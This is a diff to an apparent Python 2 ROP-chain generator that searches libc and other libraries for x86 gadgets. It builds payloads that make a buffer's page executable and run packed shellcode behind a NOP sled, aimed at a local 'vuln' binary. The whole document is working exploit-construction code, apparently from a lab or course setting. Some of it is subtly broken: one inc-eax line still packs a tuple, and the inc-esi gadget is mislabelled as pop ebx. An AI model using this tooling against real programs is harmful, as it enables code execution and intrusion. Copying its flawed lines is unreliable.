@@ -313,10 +313,11 @@ def find_gadget_addr(lib_list, func):
     for entry in lib_list:
         offset = func(entry[0])
         if offset != 0:
-            return (entry[1] + offset)
+            ans = entry[1] + offset
+            return (ans, entry[2])
 
-    print 'Unable to find gadget address for %s !' %(func)
-    return 0
+    #print 'Unable to find gadget address for %s !' %(func)
+    return (0, "")
 
 def gfind_pop_edx(gadgetMap):
     for gadget_addr in gadgetMap:
@@ -330,7 +331,7 @@ def gfind_pop_edx(gadgetMap):
         if ilist == [["mov", "edx, dword ptr [esp]"], ["add", "esp, 4"], ["ret", ""]]:
             return gadget_addr
 
-    print "gfind_pop_edx - 0"
+    #print "gfind_pop_edx - 0"
     return 0
 
 def gfind_inc_edx(gadgetMap):
@@ -346,7 +347,7 @@ def gfind_inc_edx(gadgetMap):
             return gadget_addr
         if ilist == [["sub", "edx, 0xffffffff"], ["ret", ""]]:
             return gadget_addr
-    print "gfind_inc_edx - 0"
+    #print "gfind_inc_edx - 0"
     return 0
 
 def gfind_pop_ebx(gadgetMap):
@@ -361,7 +362,7 @@ def gfind_pop_ebx(gadgetMap):
         if ilist == [["mov", "ebx, dword ptr [esp]"], ["add", "esp, 4"], ["ret", ""]]:
             return gadget_addr
 
-    print "gfind_pop_ebx - 0"
+    #print "gfind_pop_ebx - 0"
     return 0
 
 def gfind_dec_ebx(gadgetMap):
@@ -377,7 +378,7 @@ def gfind_dec_ebx(gadgetMap):
             return gadget_addr
         if ilist == [["add", "ebx, 0xffffffff"], ["ret", ""]]:
             return gadget_addr
-    print "gfind_dec_ebx - 0"
+    #print "gfind_dec_ebx - 0"
     return 0
 
 def gfind_pop_esi(gadgetMap):
@@ -392,7 +393,7 @@ def gfind_pop_esi(gadgetMap):
         if ilist == [["mov", "esi, dword ptr [esp]"], ["add", "esp, 4"], ["ret", ""]]:
             return gadget_addr
 
-    print "gfind_pop_esi - 0"
+    #print "gfind_pop_esi - 0"
     return 0
 
 def gfind_inc_esi(gadgetMap):
@@ -410,7 +411,7 @@ def gfind_inc_esi(gadgetMap):
             return gadget_addr
         if ilist == [["sub", "esi, 0xffffffff"], ["ret", ""]]:
             return gadget_addr
-    print "gfind_inc_esi - 0"
+    #print "gfind_inc_esi - 0"
     return 0
 
 def gfind_dec_esi(gadgetMap):
@@ -426,7 +427,7 @@ def gfind_dec_esi(gadgetMap):
             return gadget_addr
         if ilist == [["add", "esi, 0xffffffff"], ["ret", ""]]:
             return gadget_addr
-    print "gfind_dec_esi - 0"
+    #print "gfind_dec_esi - 0"
     return 0
 
 def gfind_double_esi(gadgetMap):
@@ -440,7 +441,7 @@ def gfind_double_esi(gadgetMap):
             return gadget_addr
         if ilist == [["shl", "esi, 1"], ["ret", ""]]:
             return gadget_addr
-    print "gfind_double_esi - 0"
+    #print "gfind_double_esi - 0"
     return 0
 
 def gfind_mov_eax_esi(gadgetMap):
@@ -456,7 +457,7 @@ def gfind_mov_eax_esi(gadgetMap):
             return gadget_addr
         if ilist == [["xchg", "esi, eax"], ["ret", ""]]:
             return gadget_addr
-    print "gfind_mov_eax_esi - 0"
+    #print "gfind_mov_eax_esi - 0"
     return 0
 
 def gfind_mov_ecx_eax(gadgetMap):
@@ -476,7 +477,7 @@ def gfind_mov_ecx_eax(gadgetMap):
             return gadget_addr
         if ilist == [["xchg", "ecx, eax"], ["and", "al, 0x5b"], ["ret", ""]]:
             return gadget_addr
-    print "gfind_mov_ecx_eax - 0"
+    #print "gfind_mov_ecx_eax - 0"
     return 0
 
 def gfind_syscall(gadgetMap):
@@ -490,25 +491,35 @@ def gfind_syscall(gadgetMap):
             return gadget_addr
         if ilist == [["call", "dword ptr gs:[0x10]"], ["ret", ""]]:
             return gadget_addr
-    print "gfind_syscall - 0"
+    #print "gfind_syscall - 0"
     return 0
 
 def build_rop_chain_syscall_generic(lib_list, buf_address):
     minus_one = 0xffffffff
     dummy_gadget = 0x11111111
     rop_payload = ""
-
+    result = True
     generic_gadget_list = []
 
     #Get 7 in edx
 
-    gadget1 = find_gadget_addr(lib_list, gfind_pop_edx)
+    gadget1, lib_name = find_gadget_addr(lib_list, gfind_pop_edx)
+    if gadget1 == 0:
+        print 'Unable to find gadget for pop edx; ret;'
+        result = False
+    else:
+        print 'Found gadget pop edx; ret in %s library' %(lib_name)    
 
     generic_gadget_list.append(gadget1)
 
     generic_gadget_list.append(minus_one)
 
-    gadget2 = find_gadget_addr(lib_list, gfind_inc_edx)
+    gadget2, lib_name = find_gadget_addr(lib_list, gfind_inc_edx)
+    if gadget2 == 0:
+        print 'Unable to find gadget for inc edx; ret;'
+        result = False
+    else:
+        print 'Found gadget inc edx; ret in %s library' %(lib_name)
 
     i = 0
     while i < 8:
@@ -516,43 +527,80 @@ def build_rop_chain_syscall_generic(lib_list, buf_address):
         i += 1
 
     #Get aligned memory address in ebx
-    gadget3 = find_gadget_addr(lib_list, gfind_pop_ebx)
+    gadget3, lib_name = find_gadget_addr(lib_list, gfind_pop_ebx)
+    if gadget3 == 0:
+        print 'Unable to find gadget for pop ebx; ret;'
+        result = False
+    else:
+        print 'Found gadget pop ebx; ret in %s library' %(lib_name)
 
     generic_gadget_list.append(gadget3)
 
     aligned_memory_address = ((buf_address >> 12) << 12) + 1
     generic_gadget_list.append(aligned_memory_address)
 
-    gadget4 = find_gadget_addr(lib_list, gfind_dec_ebx)
+    gadget4, lib_name = find_gadget_addr(lib_list, gfind_dec_ebx)
+    if gadget4 == 0:
+        print 'Unable to find gadget for dec ebx; ret;'
+        result = False
+    else:
+        print 'Found gadget dec ebx; ret in %s library' %(lib_name)
+
 
     generic_gadget_list.append(gadget4)
 
     #Length in esi
-    gadget5 = find_gadget_addr(lib_list, gfind_pop_esi)
+    gadget5, lib_name = find_gadget_addr(lib_list, gfind_pop_esi)
+    if gadget5 == 0:
+        print 'Unable to find gadget for pop esi; ret;'
+        result = False
+    else:
+        print 'Found gadget pop esi; ret in %s library' %(lib_name)
+
 
     generic_gadget_list.append(gadget5)
 
     generic_gadget_list.append(minus_one)
 
-    gadget6 = find_gadget_addr(lib_list, gfind_inc_esi)
+    gadget6, lib_name = find_gadget_addr(lib_list, gfind_inc_esi)
+    if gadget6 == 0:
+        print 'Unable to find gadget for pop ebx; ret;'
+        result = False
+    else:
+        print 'Found gadget pop ebx; ret in %s library' %(lib_name)
 
     i = 0
     while i < 2:
         generic_gadget_list.append(gadget6)
         i += 1
 
-    gadget7 = find_gadget_addr(lib_list, gfind_double_esi)
+    gadget7, lib_name = find_gadget_addr(lib_list, gfind_double_esi)
+    if gadget7 == 0:
+        print 'Unable to find gadget for add esi, esi; ret;'
+        result = False
+    else:
+        print 'Found gadget add esi, esi; ret in %s library' %(lib_name)
 
     i = 0
     while i < 12:
         generic_gadget_list.append(gadget7)
         i += 1
 
-    gadget8 = find_gadget_addr(lib_list, gfind_mov_eax_esi)
+    gadget8, lib_name = find_gadget_addr(lib_list, gfind_mov_eax_esi)
+    if gadget8 == 0:
+        print 'Unable to find gadget for mov eax, esi; ret;'
+        result = False
+    else:
+        print 'Found gadget mov eax, esi; ret in %s library' %(lib_name)
 
     generic_gadget_list.append(gadget8)
 
-    gadget9 = find_gadget_addr(lib_list, gfind_mov_ecx_eax)
+    gadget9, lib_name = find_gadget_addr(lib_list, gfind_mov_ecx_eax)
+    if gadget9 == 0:
+        print 'Unable to find gadget for mov ecx, eax; ret;'
+        result = False
+    else:
+        print 'Found gadget mov ecx, eax; ret in %s library' %(lib_name)
 
     generic_gadget_list.append(gadget9)
 
@@ -572,7 +620,12 @@ def build_rop_chain_syscall_generic(lib_list, buf_address):
         generic_gadget_list.append(gadget7)
         i += 1
 
-    gadget10 = find_gadget_addr(lib_list, gfind_dec_esi)
+    gadget10, lib_name = find_gadget_addr(lib_list, gfind_dec_esi)
+    if gadget10 == 0:
+        print 'Unable to find gadget for dec esi; ret;'
+        result = False
+    else:
+        print 'Found gadget dec esi; ret in %s library' %(lib_name)
 
     i = 0
     while i < 3:
@@ -582,7 +635,13 @@ def build_rop_chain_syscall_generic(lib_list, buf_address):
     generic_gadget_list.append(gadget8)
 
     #syscall
-    gadget11 = find_gadget_addr(lib_list, gfind_syscall)
+    gadget11, lib_name = find_gadget_addr(lib_list, gfind_syscall)
+    if gadget11 == 0:
+        print 'Unable to find gadget for syscall; ret;'
+        result = False
+    else:
+        print 'Found gadget syscall; ret in %s library' %(lib_name)
+
 
     generic_gadget_list.append(gadget11)
 
@@ -601,89 +660,113 @@ def build_rop_chain_syscall_generic(lib_list, buf_address):
 
     rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload
 
-    return rop_payload
+    return (rop_payload, result)
 
 def build_rop_chain_libc_syscalls(lib_list, buf_address):
 
     rop_payload = ""
+    result = True
   
-    temp = find_gadget_addr(lib_list, find_xor_eax_eax)
+    temp, lib_name = find_gadget_addr(lib_list, find_xor_eax_eax)
     if temp == 0:
         print 'Unable to find gadget for xor  eax,eax; ret;'
-        return False 
+        result = False
+    else:
+        print 'Found gadget xor  eax, eax; ret in %s library' %(lib_name)
+ 
     xor_eax_addr = pack_value(temp)
     ret_addr = xor_eax_addr
     rop_payload += ret_addr
-    print 'Address of xor eax,eax; ret = 0x%x' %(temp)
-
+    #print 'Address of xor eax,eax; ret = 0x%x' %(temp)
     
-    temp = find_gadget_addr(lib_list, find_dec_eax)
+    temp, lib_name = find_gadget_addr(lib_list, find_dec_eax)
     if temp == 0:
         print 'Unable to find gadget for dec  eax; ret;'
-        return False
+        result = False
+    else:
+        print 'Found gadget dec  eax; ret in %s library' %(lib_name)
+
     dec_eax_addr = pack_value(temp)
     rop_payload += dec_eax_addr
-    print 'Address of dec eax; ret = 0x%x' %(temp)
+    #print 'Address of dec eax; ret = 0x%x' %(temp)
 
 
-    temp = find_gadget_addr(lib_list, find_and_eax_x1000)
+    temp, lib_name = find_gadget_addr(lib_list, find_and_eax_x1000)
     if temp == 0:
-        print 'Unable to find gadget for and eax, 0x1000; ret;'
-        return False
+        print 'Unable to find gadget and eax, 0x1000; ret;'
+        result = False
+    else:
+        print 'Found gadget and  eax, 0x1000; ret in %s library' %(lib_name)
+    
     and_eax_x1000_addr = pack_value(temp) 
     rop_payload += and_eax_x1000_addr
-    print 'Address of and eax, 0x1000; ret = 0x%x' %(temp)
+    #print 'Address of and eax, 0x1000; ret = 0x%x' %(temp)
 
 
-    temp = find_gadget_addr(lib_list, find_mov_ecx_eax)
+    temp, lib_name = find_gadget_addr(lib_list, find_mov_ecx_eax)
     if temp == 0:
         print 'Unable to find gadget for mov ecx, eax; ret;'
-        return False
+        result = False
+    else:
+        print 'Found gadget mov  ecx, eax; ret in %s library' %(lib_name)
+
     mov_ecx_eax_addr = pack_value(temp)
     rop_payload += mov_ecx_eax_addr
     rop_payload += 4 * pack_value(0x11111111)
-    print 'Address of mov ecx, eax; ret = 0x%x' %(temp)
+    #print 'Address of mov ecx, eax; ret = 0x%x' %(temp)
 
     rop_payload += xor_eax_addr
 
 
-    temp = find_gadget_addr(lib_list, find_mov_edx_eax)
+    temp, lib_name = find_gadget_addr(lib_list, find_mov_edx_eax)
     if temp == 0:
         print 'Unable to find gadget for mov edx, eax; ret;'
-        return False
+        result = False
+    else:
+        print 'Found gadget mov  edx, eax; ret in %s library' %(lib_name)
+
+
     mov_edx_eax_addr = pack_value(temp)
     rop_payload += mov_edx_eax_addr
     rop_payload += 3 * pack_value(0x11111111)
-    print 'Address of mov edx, eax; ret = 0x%x' %(temp)
+    #print 'Address of mov edx, eax; ret = 0x%x' %(temp)
 
-
-    temp = find_gadget_addr(lib_list, find_push_esp_pop_ebx)
+    temp, lib_name = find_gadget_addr(lib_list, find_push_esp_pop_ebx)
     if temp == 0:
         print 'Unable to find gadget for push esp; pop ebx; ret;'
-        return False
+        result = False
+    else:
+        print 'Found gadget push  esp; pop ebx; ret in %s library' %(lib_name)
+
     push_esp_addr = pack_value(temp)
     rop_payload += push_esp_addr
     rop_payload += pack_value(0x11111111)
-    print 'Address of push esp, pop ebx; ret = 0x%x' %(temp)
+    #print 'Address of push esp, pop ebx; ret = 0x%x' %(temp)
 
 
-    temp = find_gadget_addr(lib_list, find_xchg_eax_ebx)
+    temp, lib_name = find_gadget_addr(lib_list, find_xchg_eax_ebx)
     if temp == 0:
         print 'Unable to find gadget for xchg eax, ebx; ret;'
-        return False
+        result = False
+    else:
+        print 'Found gadget xchg  eax, ebx; ret in %s library' %(lib_name)
+
     xchg_eax_ebx_addr = pack_value(temp)
     rop_payload += xchg_eax_ebx_addr
-    print 'Address of xchg eax, ebx; ret = 0x%x' %(temp)
+    #print 'Address of xchg eax, ebx; ret = 0x%x' %(temp)
 
 
-    temp = find_gadget_addr(lib_list, find_and_eax_xfffff000)
+    temp, lib_name = find_gadget_addr(lib_list, find_and_eax_xfffff000)
     if temp == 0:
         print 'Unable to find gadget for and eax, 0xfffff000; ret;'
-        return False
+        result = False
+    else:
+        print 'Found gadget and  eax, 0xfffff000; ret in %s library' %(lib_name)
+
     and_eax_xff_addr = pack_value(temp)
     rop_payload += and_eax_xff_addr
     rop_payload += pack_value(0x11111111)
-    print 'Address of and eax, 0xfffff000; ret = 0x%x' %(temp)
+    #print 'Address of and eax, 0xfffff000; ret = 0x%x' %(temp)
 
 
     rop_payload += xchg_eax_ebx_addr
@@ -692,41 +775,54 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
     rop_payload += xor_eax_addr
 
 
-    temp = find_gadget_addr(lib_list, find_inc_eax)
+    temp, lib_name = find_gadget_addr(lib_list, find_inc_eax)
     if temp == 0:
         print 'Unable to find gadget for inc eax; ret;'
-        return False
+        result = False
+    else:
+        print 'Found gadget inc  eax; ret in %s library' %(lib_name)
+
     inc_eax_addr = pack_value(find_gadget_addr(lib_list, find_inc_eax))
     rop_payload += 7 * inc_eax_addr
-    print 'Address of inc eax; ret = 0x%x' %(temp)
+    #print 'Address of inc eax; ret = 0x%x' %(temp)
 
 
-    temp = find_gadget_addr(lib_list, find_xchg_eax_edx)
+    temp, lib_name = find_gadget_addr(lib_list, find_xchg_eax_edx)
     if temp == 0:
         print 'Unable to find gadget for xchg eax, edx; ret;'
-        return False
+        result = False
+    else:
+        print 'Found gadget xchg  eax, edx; ret in %s library' %(lib_name)
+
     xchg_eax_edx_addr = pack_value(temp)
     rop_payload += xchg_eax_edx_addr
-    print 'Address of xchg eax, edx; ret = 0x%x' %(temp)
+    #print 'Address of xchg eax, edx; ret = 0x%x' %(temp)
 
 
-    temp = find_gadget_addr(lib_list, find_add_eax_x20)
+    temp, lib_name = find_gadget_addr(lib_list, find_add_eax_x20)
     if temp == 0:
         print 'Unable to find gadget for add eax, 0x20; ret;'
-        return False
+        result = False
+    else:
+        print 'Found gadget add  eax, 0x20; ret in %s library' %(lib_name)
+
+
     add_eax_x20_addr = pack_value(temp)
     rop_payload += 4 * (add_eax_x20_addr + 2 * pack_value(0x11111111))
-    print 'Address of add eax, 0x20; ret = 0x%x' %(temp)
+    #print 'Address of add eax, 0x20; ret = 0x%x' %(temp)
 
 
     rop_payload += 3 * dec_eax_addr
 
-    temp = find_gadget_addr(lib_list, find_syscall)
+    temp, lib_name = find_gadget_addr(lib_list, find_syscall)
     if temp == 0:
         print 'Unable to find gadget for syscall; ret;'
-        return False
+        result = False
+    else:
+        print 'Found gadget syscall; ret in %s library' %(lib_name)
+
     syscall_addr = pack_value(temp)
-    print 'Address of syscall; ret = 0x%x' %(temp)
+    #print 'Address of syscall; ret = 0x%x' %(temp)
 
 
     nop_len = buf_len + 8 - len(packed_shellcode) - (len(ret_addr) * 10)
@@ -734,10 +830,11 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
 
     rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload + syscall_addr + pack_value(buf_address) 
 
-    return rop_payload 
+    return (rop_payload, result)
 
 
 def build_rop_chain_libc(lib_list, buf_address):
+    result = True
     libc_base_address = lib_list[0][1]
     f = open(lib_list[0][2], 'rb')
     if f == None:
@@ -756,17 +853,21 @@ def build_rop_chain_libc(lib_list, buf_address):
     null_byte_location = pack_value(libc_base_address + find_null_byte(elffile))
     print 'NULL byte address = 0x%x' %(libc_base_address + find_null_byte(elffile))
 
-    pop2_addr = pack_value(find_gadget_addr(lib_list, find_pop2_ret))
-    if pop2_addr == 0:
-        print 'No gadget found for pop, pop, ret;'
-        return False
-    print 'Address of pop, pop, ret; = 0x%x' %(find_gadget_addr(lib_list, find_pop2_ret))    
+    temp, lib_name = find_gadget_addr(lib_list, find_pop2_ret)
+    if temp == 0:
+        print 'Unable to find gadget pop, pop, ret;'
+        result = False
+    else:
+        pop2_addr = pack_value(temp)
+        print 'Found gadget pop, pop, ret in %s library' %(lib_name)
 
-    pop3_addr = pack_value(find_gadget_addr(lib_list, find_pop3_ret))
-    if pop3_addr == 0:
+    temp, lib_name = find_gadget_addr(lib_list, find_pop3_ret)
+    if temp == 0:
         print 'No gadget found for pop, pop, pop, ret;'
-        return False
-    print 'Address of pop, pop, pop, ret; = 0x%x' %(find_gadget_addr(lib_list, find_pop3_ret))
+        result = False
+    else:
+        pop3_addr = pack_value(temp)
+        print 'Found gadget pop, pop, pop, ret; in %s library' %(lib_name)
 
     memory_start_address = ((buf_address >> 12) << 12)
     memory_length = 0x1000
@@ -801,7 +902,7 @@ def build_rop_chain_libc(lib_list, buf_address):
 
     rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload
 
-    return rop_payload 
+    return (rop_payload, result)
 
 def print_rop_payload(buf):
     rows, columns = os.popen('stty size', 'r').read().split()
@@ -960,7 +1061,7 @@ if __name__ == '__main__':
 
     if_use_gdb = False
 
-    parser = argparse.ArgumentParser('ROP-Chain-Compiler')
+    parser = argparse.ArgumentParser('python rop-generator.py')
     vuln_bin = 'vuln' 
     parser.add_argument("-lib", type=str, help="Libraries to search for gadgets - default is libc")
     parser.add_argument("-t", action='store_true', help="Use program as ROP tester") 
@@ -994,15 +1095,15 @@ if __name__ == '__main__':
 
     if args.lib is None:
         buffer_address = find_buffer_addr(vuln_bin, 392, if_use_gdb)
-        rop_payload = build_rop_chain_libc(lib_list, buffer_address)
+        rop_payload, result = build_rop_chain_libc(lib_list, buffer_address)
 
     elif (len(libraries) == 1) and (libraries[0].count("libc") == 1):
         buffer_address = find_buffer_addr(vuln_bin, 444, if_use_gdb)
-        rop_payload = build_rop_chain_libc_syscalls(lib_list, buffer_address + 128)
+        rop_payload, result = build_rop_chain_libc_syscalls(lib_list, buffer_address + 128)
 
     else:
         buffer_address = find_buffer_addr(vuln_bin, 416, if_use_gdb)
-        rop_payload = build_rop_chain_syscall_generic(lib_list, buffer_address + 128)
+        rop_payload, result = build_rop_chain_syscall_generic(lib_list, buffer_address + 128)
 
     rm_command = "rm -rf ./vuln2 ./vuln2.c"
     rmproc = subprocess.Popen(rm_command, shell=True, stdout=subprocess.PIPE)
